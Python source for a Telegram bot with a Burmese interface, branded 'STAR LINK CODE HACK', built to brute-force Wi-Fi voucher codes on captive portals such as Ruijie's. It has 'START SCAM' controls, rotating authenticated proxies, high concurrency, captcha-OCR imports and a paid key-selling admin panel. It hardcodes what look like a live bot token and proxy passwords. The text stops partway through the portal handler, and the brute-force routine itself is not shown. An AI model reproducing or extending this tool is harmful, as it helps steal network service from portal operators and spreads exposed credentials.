import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, hashlib, threading
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
import sqlite3
from contextlib import contextmanager

# --- Configuration 
BOT_TOKEN = "8889706834:AAHppLiH8XMOcxsTTE6EVXY932q4XKCi5mQ"
ADMIN_IDS = ["6537847588", "8320683349"]
FORWARD_CHANNEL = "@primekenobot"

# --- SPEED CONFIGURATION ---
MAX_CONCURRENT = 500
BATCH_SIZE = 1000
CONNECTION_LIMIT = 30000
CONNECTION_PER_HOST = 15000
TIMEOUT = 15

# --- Local Storage Setup ---
DB_PATH = "bot_data.db"

def get_db_connection():
    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA cache_size=10000")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS keys
                 (key TEXT PRIMARY KEY, 
                  user_id TEXT,
                  plan TEXT,
                  expires_at TEXT,
                  code_limit INTEGER DEFAULT 1000,
                  used_codes INTEGER DEFAULT 0)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS results
                 (user_id TEXT PRIMARY KEY,
                  codes TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id TEXT PRIMARY KEY,
                  key TEXT,
                  registered_at TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_settings
                 (user_id TEXT PRIMARY KEY,
                  proxy_enabled INTEGER DEFAULT 1)''')
    
    conn.commit()
    conn.close()

init_db()

# --- In-memory caches ---
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
paid_users = {}
_voucher_sem = None
_start_time = time.monotonic()

# --- Proxy List (3 Proxies - ONLY for URL checking) ---
PROXY_LIST = [
    "gzsvv1pggl7k:3g9xpulazhkz2c2@65.111.5.6:3129",
    "y2g26w7t3tv4:p5ouenejkn07fvy@209.50.179.187:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.2.10:3129"
]

_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

# --- Helper Functions ---
def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

# --- Database Functions ---
@contextmanager
def get_db_cursor():
    conn = get_db_connection()
    try:
        yield conn.cursor()
        conn.commit()
    finally:
        conn.close()

def db_get_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys WHERE key = ?", (key,))
        result = c.fetchone()
        if result:
            return {"key": result[0], "user_id": result[1], "plan": result[2], "expires_at": result[3], "code_limit": result[4], "used_codes": result[5]}
    return None

def db_get_user(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return {"user_id": result[0], "key": result[1], "registered_at": result[2]}
    return None

def db_get_user_by_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE key = ?", (key,))
        result = c.fetchone()
        if result:
            return {"user_id": result[0], "key": result[1], "registered_at": result[2]}
    return None

def db_get_results(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT codes FROM results WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return json.loads(result[0])
    return []

def db_save_results(user_id, codes):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO results (user_id, codes) VALUES (?, ?)", (user_id, json.dumps(codes)))

def db_add_user(user_id, key):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO users (user_id, key, registered_at) VALUES (?, ?, ?)", (user_id, key, datetime.now(timezone.utc).isoformat()))

def db_add_key(key, user_id, plan, expires_at, code_limit):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO keys (key, user_id, plan, expires_at, code_limit, used_codes) VALUES (?, ?, ?, ?, ?, ?)", (key, user_id, plan, expires_at, code_limit, 0))

def db_delete_key(key):
    with get_db_cursor() as c:
        c.execute("DELETE FROM keys WHERE key = ?", (key,))

def db_update_used_codes(key, used_codes):
    with get_db_cursor() as c:
        c.execute("UPDATE keys SET used_codes = ? WHERE key = ?", (used_codes, key))

def db_get_all_keys():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys")
        results = c.fetchall()
        keys = {}
        for r in results:
            keys[r[0]] = {"user_id": r[1], "plan": r[2], "expires_at": r[3], "code_limit": r[4], "used_codes": r[5]}
        return keys

def db_get_all_users():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users")
        results = c.fetchall()
        return [r[0] for r in results]

def check_key_expiration(expires_at):
    try:
        if expires_at == "9999-12-31T23:59:59Z":
            return True
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp_time
    except:
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {"30m": timedelta(minutes=30), "1h": timedelta(hours=1), "1d": timedelta(days=1), "7d": timedelta(days=7), "1m": timedelta(days=30), "1y": timedelta(days=365), "unlimited": None}
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def generate_random_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def db_get_proxy_setting(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT proxy_enabled FROM user_settings WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        if result:
            return bool(result[0])
    return True

def db_set_proxy_setting(user_id, enabled):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO user_settings (user_id, proxy_enabled) VALUES (?, ?)", (user_id, 1 if enabled else 0))

async def forward_to_channel(message_text, parse_mode=None):
    try:
        await bot.send_message(FORWARD_CHANNEL, message_text, parse_mode=parse_mode)
    except Exception as e:
        print(f"Forward error: {e}")

# ==================== KEYBOARDS ====================
def get_main_keyboard(user_id=None):
    keyboard = InlineKeyboardMarkup(row_width=2)
    if user_id:
        proxy_enabled = db_get_proxy_setting(user_id)
        proxy_text = "🔴 Proxy OFF" if not proxy_enabled else "🟢 Proxy ON"
        proxy_callback = "menu_proxy_off" if proxy_enabled else "menu_proxy_on"
    else:
        proxy_text = "🟢 Proxy ON"
        proxy_callback = "menu_proxy_off"
    
    keyboard.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton(proxy_text, callback_data=proxy_callback),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 DIGIT 6 (0-9)", callback_data="scan_6"),
        InlineKeyboardButton("🔢 DIGIT 7 (0-9)", callback_data="scan_7"),
        InlineKeyboardButton("🔢 DIGIT 8 (0-9)", callback_data="scan_8"),
        InlineKeyboardButton("🔤 ENG small 6 (a-z)", callback_data="scan_engsmall6"),
        InlineKeyboardButton("🔤 ENG small 7 (a-z)", callback_data="scan_engsmall7"),
        InlineKeyboardButton("🔤 ENG small 8 (a-z)", callback_data="scan_engsmall8"),
        InlineKeyboardButton("🔤+🔢 MIXED 6 (a-z0-9)", callback_data="scan_engmixed6"),
        InlineKeyboardButton("🔤+🔢 MIXED 7 (a-z0-9)", callback_data="scan_engmixed7"),
        InlineKeyboardButton("🔤+🔢 MIXED 8 (a-z0-9)", callback_data="scan_engmixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✅ KEY ထည့်ရန်", callback_data="menu_enter_key"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_admin_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey"),
        InlineKeyboardButton("🗑️ Delete Key", callback_data="admin_delkey"),
        InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys"),
        InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats"),
        InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
        InlineKeyboardButton("👥 Users List", callback_data="admin_users"),
        InlineKeyboardButton("🔙 Back to Menu", callback_data="admin_back")
    )
    return keyboard

def get_admin_genkey_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("⏱️ 30m", callback_data="admin_gen_30m"),
        InlineKeyboardButton("⏱️ 1h", callback_data="admin_gen_1h"),
        InlineKeyboardButton("📅 1d", callback_data="admin_gen_1d"),
        InlineKeyboardButton("📅 7d", callback_data="admin_gen_7d"),
        InlineKeyboardButton("📅 1m", callback_data="admin_gen_1m"),
        InlineKeyboardButton("📅 1y", callback_data="admin_gen_1y"),
        InlineKeyboardButton("♾️ Unlimited", callback_data="admin_gen_unlimited"),
        InlineKeyboardButton("🔙 Back", callback_data="admin_back")
    )
    return keyboard

def get_admin_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back"))
    return keyboard

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    # ⭐ KEY-FREE: ဘယ်သူမဆို ချက်ချင်း Approve ဖြစ်မယ်
    valid = True
    approve[message.chat.id] = True
    paid_users[user_id] = True
    
    proxy_status = "ON" if db_get_proxy_setting(user_id) else "OFF"
    
    welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

🎉 မင်္ဂလာပါခင်ဗျာ! 
✅ သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။
♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။
🔄 Proxy Status: {proxy_status}

အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))
    await forward_to_channel(f"🆕 New User Started\n\n👤 Name: {user_name}\n🆔 ID: {user_id}")

@bot.message_handler(commands=['admin'])
async def admin_panel(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "❌ သင် Admin မဟုတ်ပါ။")
        return
    
    text = """🔐 **Admin Panel**

Welcome to Admin Control Panel!

အောက်ပါ ခလုတ်များမှ သင်လိုချင်တာကို ရွေးချယ်ပါ။"""
    
    await bot.reply_to(message, text, reply_markup=get_admin_main_keyboard(), parse_mode="Markdown")
    await forward_to_channel(f"🔐 Admin Panel Accessed by: {message.from_user.first_name}")

# ==================== MAIN CALLBACK HANDLER ====================
@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    
    # ========== ADMIN CALLBACKS ==========
    if call.data.startswith("admin_"):
        if not is_admin(str(chat_id)):
            await bot.answer_callback_query(call.id, "❌ သင် Admin မဟုတ်ပါ။")
            return
        
        if call.data == "admin_back":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔐 **Admin Panel**\n\nအောက်ပါ ခလုတ်များမှ သင်လိုချင်တာကို ရွေးချယ်ပါ။", reply_markup=get_admin_main_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return
        
        if call.data == "admin_genkey":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔑 **Select Key Plan**\n\nသင်ထုတ်လိုသော Key Plan ကို ရွေးချယ်ပါ။", reply_markup=get_admin_genkey_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return
        
        if call.data == "admin_gen_30m":
            await handle_genkey_plan_selection(chat_id, call.message, "30m")
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_gen_1h":
            await handle_genkey_plan_selection(chat_id, call.message, "1h")
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_gen_1d":
            await handle_genkey_plan_selection(chat_id, call.message, "1d")
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_gen_7d":
            await handle_genkey_plan_selection(chat_id, call.message, "7d")
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_gen_1m":
            await handle_genkey_plan_selection(chat_id, call.message, "1m")
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_gen_1y":
            await handle_genkey_plan_selection(chat_id, call.message, "1y")
            await bot.answer_callback_query(call.id)
            return
        if call.data == "admin_gen_unlimited":
            await handle_genkey_plan_selection(chat_id, call.message, "unlimited")
            await bot.answer_callback_query(call.id)
            return
        
        if call.data == "admin_delkey":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🗑️ **Delete Key**\n\nKey ဖျက်ရန်:\n\n`/delkey [key]`", reply_markup=get_admin_back_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return
        
        if call.data == "admin_listkeys":
            await bot.answer_callback_query(call.id)
            await listkeys_command(call.message)
            return
        
        if call.data == "admin_stats":
            await bot.answer_callback_query(call.id)
            await stats_command(call.message)
            return
        
        if call.data == "admin_broadcast":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="📢 **Broadcast Message**\n\n`/sendall [your_message]`", reply_markup=get_admin_back_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id)
            return
        
        if call.data == "admin_users":
            await bot.answer_callback_query(call.id)
            await users_list_command(call.message)
            return

    # ========== PROXY TOGGLE (Key check ဖြုတ်ထားပြီ) ==========
    if call.data == "menu_proxy_on" or call.data == "menu_proxy_off":
        current = db_get_proxy_setting(user_id)
        new_status = not current
        db_set_proxy_setting(user_id, new_status)
        
        status_text = "ON" if new_status else "OFF"
        emoji = "🟢" if new_status else "🔴"
        
        text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

✅ PAID USER - Unlimited Access
{emoji} Proxy Status: {status_text}"""
        
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard(user_id))
        await bot.answer_callback_query(call.id, f"✅ Proxy {status_text} ဖြစ်သွားပါပြီ။")
        await forward_to_channel(f"🔄 Proxy Toggled\n\n👤 User: {user_name}\n🆔 ID: {user_id}\n📊 Status: {status_text}")
        return
    
    # ========== USER CALLBACKS ==========
    if call.data == "menu_back":
        proxy_enabled = db_get_proxy_setting(user_id)
        status_text = "ON" if proxy_enabled else "OFF"
        emoji = "🟢" if proxy_enabled else "🔴"
        text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

✅ PAID USER - Unlimited Access
{emoji} Proxy Status: {status_text}"""
        
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard(user_id))
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_free_trial":
        text = f"""🔗 Portal URL ထည့်သွင်းရန်:

/portal [your_portal_url]

ဥပမာ:
/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00

Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"""
        
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_paid":
        text = f"""♾️ သင်သည် PAID USER ဖြစ်ပါပြီ။
Key မလိုအပ်ပါ။
အောက်ပါ Menu ကို ဆက်သုံးနိုင်ပါသည်။"""
        
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_enter_key":
        await bot.send_message(chat_id, f"♾️ သင်သည် PAID USER ဖြစ်ပါပြီ။ Key မလိုအပ်ပါ။")
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_result":
        results = db_get_results(user_id)
        if results:
            codes = "\n".join(results)
            text = f"✅ Found Codes:\n{codes}"
        else:
            text = "📋 သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
        
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_recheck":
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔄 Recheck ကို စတင်နေပါသည်...", reply_markup=get_scam_button_keyboard())
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return

    if call.data == "menu_start_scam":
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။ ကျေးဇူးပြု၍ VOUCHER အရင်ရွေးပါ။", reply_markup=get_voucher_keyboard())
            await bot.answer_callback_query(call.id)
            return
        
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။", reply_markup=get_scam_button_keyboard())
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n\nSTOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။", reply_markup=get_scam_button_keyboard(), parse_mode="Markdown")
        
        progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
        scan_id = str(uuid.uuid4())
        portal_url = user_data[chat_id].get('session_url', 'Unknown')
        await forward_to_channel(f"🚀 **Scan Started**\n\n👤 **User:** {user_name}\n🆔 **User ID:** `{user_id}`\n🔢 **Mode:** {mode}\n🔗 **Portal URL:**\n`{portal_url}`", parse_mode="Markdown")

        task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=call.message, progress_msg=progress_msg, start_digit=start_digit))
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        if chat_id not in user_data:
            user_data[chat_id] = {}
        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return

        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔢 DIGIT {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -", reply_markup=get_digit_keyboard(mode))
            await bot.answer_callback_query(call.id)
            return

        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        text = f"""🔍 သင်ရွေးချယ်ထားသော VOUCHER အမျိုးအစား: {mode}

✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။
🛑 STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။"""
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]
        digit = parts[2]
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
        
        text = f"🔍 VOUCHER Mode: {mode}\n"
        if digit == "random":
            text += "🔢 ထိပ်စီးနံပါတ်: Random ဖြစ်ရှာရန်"
        else:
            text += f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text + "\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

async def handle_genkey_plan_selection(chat_id, message, plan):
    if chat_id not in user_data:
        user_data[chat_id] = {}
    user_data[chat_id]['admin_gen_plan'] = plan
    
    await bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=f"🔑 **Selected Plan: {plan}**\n\nကျေးဇူးပြု၍ အောက်ပါအတိုင်း ရိုက်ထည့်ပါ:\n\n`/genkey {plan} [code_limit] [user_id]`", reply_markup=get_admin_back_keyboard(), parse_mode="Markdown")

# ==================== ADMIN COMMANDS ====================
async def listkeys_command(message):
    try:
        keys = db_get_all_keys()
        if not keys:
            await bot.reply_to(message, "📋 Registered key မရှိသေးပါ။")
            return
        lines = []
        for key, data in keys.items():
            user_info = db_get_user_by_key(key)
            user_id = user_info["user_id"] if user_info else "Not Registered"
            if data["expires_at"] == "9999-12-31T23:59:59Z":
                expires_str = "♾️ Unlimited"
            else:
                try:
                    exp_dt = datetime.fromisoformat(data["expires_at"].replace("Z", "+00:00"))
                    now = datetime.now(timezone.utc)
                    if exp_dt < now:
                        expires_str = "❌ Expired"
                    else:
                        diff = exp_dt - now
                        days = diff.days
                        hours, rem = divmod(diff.seconds, 3600)
                        minutes = rem // 60
                        expires_str = f"{days}d {hours}h {minutes}m left"
                except:
                    expires_str = data["expires_at"]
            lines.append(f"🔑 `{key}`\n   👤 User: {user_id}\n   📋 Plan: {data['plan']}\n   🔢 Limit: {data['used_codes']}/{data['code_limit']}\n   ⏰ Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(keys)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096], parse_mode="Markdown")
        else:
            await bot.reply_to(message, text, parse_mode="Markdown")
    except Exception as e:
        print(f"Error at listkeys {e}")

async def stats_command(message):
    keys = db_get_all_keys()
    users = db_get_all_users()
    total_keys = len(keys)
    total_users = len(users)
    active_keys = 0
    for key, data in keys.items():
        if check_key_expiration(data["expires_at"]):
            active_keys += 1
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    approved_users = len(paid_users)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(message, f"📊 **Bot Statistics**\n\n⏱ Uptime: {hours}h {minutes}m {seconds}s\n🔍 Active Scans: {active_scans}\n✅ PAID Users: {approved_users}\n🔑 Total Keys: {total_keys}\n✅ Active Keys: {active_keys}\n👥 Registered Users: {total_users}\n📦 Sessions Loaded: {len(user_data)}\n⚡ Speed: {MAX_CONCURRENT} concurrent", parse_mode="Markdown")

async def users_list_command(message):
    users = db_get_all_users()
    if not users:
        await bot.reply_to(message, "👥 User မရှိသေးပါ။")
        return
    lines = []
    for uid in users:
        user_info = db_get_user(uid)
        if user_info:
            key_info = db_get_key(user_info["key"])
            if key_info:
                status = "✅ Active" if check_key_expiration(key_info["expires_at"]) else "❌ Expired"
                proxy_status = "ON" if db_get_proxy_setting(uid) else "OFF"
                lines.append(f"👤 ID: `{uid}`\n   🔑 Key: `{user_info['key']}`\n   📋 Plan: {key_info['plan']}\n   🔢 Limit: {key_info['used_codes']}/{key_info['code_limit']}\n   📊 Status: {status}\n   🔄 Proxy: {proxy_status}")
    text = f"👥 **Users List** ({len(users)})\n\n" + "\n\n".join(lines)
    if len(text) > 4096:
        for i in range(0, len(text), 4096):
            await bot.send_message(message.chat.id, text[i:i+4096], parse_mode="Markdown")
    else:
        await bot.reply_to(message, text, parse_mode="Markdown")

# ==================== USER COMMANDS (Key check ဖြုတ်ထားပြီ) ====================
@bot.message_handler(commands=['key'])
async def handle_key(message):
    user_id = str(message.chat.id)
    # ⭐ Key-Free: ချက်ချင်း Approve ဖြစ်မယ်
    approve[message.chat.id] = True
    paid_users[user_id] = True
    
    await bot.reply_to(message, f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n💡 Key-Free ဖြစ်လို့ Key မလိုအပ်ပါ။")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 4:
            await bot.reply_to(message, "Usage:\n/genkey [plan] [code_limit] [user_id]")
            return
        plan = args[1]
        try:
            code_limit = int(args[2])
        except ValueError:
            await bot.reply_to(message, "❌ Code limit သည် နံပါတ်ဖြစ်ရမည်။")
            return
        user_id = args[3]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "❌ Plan မမှန်ပါ။")
            return
        new_key = generate_random_key(12)
        db_add_key(new_key, user_id, plan, expiry, code_limit)
        await bot.reply_to(message, f"✅ Key Generated!\n🔑 KEY: `{new_key}`\n👤 USER ID: `{user_id}`", parse_mode="Markdown")
        await forward_to_channel(f"🔑 **New Key Generated**\n🔑 KEY: `{new_key}`\n👤 USER ID: `{user_id}`", parse_mode="Markdown")
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey [key]")
            return
        key = args[1]
        key_info = db_get_key(key)
        if not key_info:
            await bot.reply_to(message, f"❌ Key {key} မတွေ့ပါ။")
            return
        db_delete_key(key)
        await bot.reply_to(message, f"✅ Key Deleted\n🔑 KEY: {key}")
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['sendall'])
async def send_all_broadcast(message):
    if not is_admin(str(message.chat.id)):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /sendall [your_message]")
        return
    broadcast_text = f"📢 ADMIN NOTIFICATION\n\n{args[1]}"
    users = db_get_all_users()
    count = 0
    for uid in users:
        try:
            await bot.send_message(int(uid), broadcast_text)
            count += 1
            await asyncio.sleep(0.1)
        except:
            continue
    await bot.reply_to(message, f"✅ User {count} ယောက်ထံသို့ စာပို့ပြီးပါပြီ။")

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    user_id = str(message.chat.id)
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
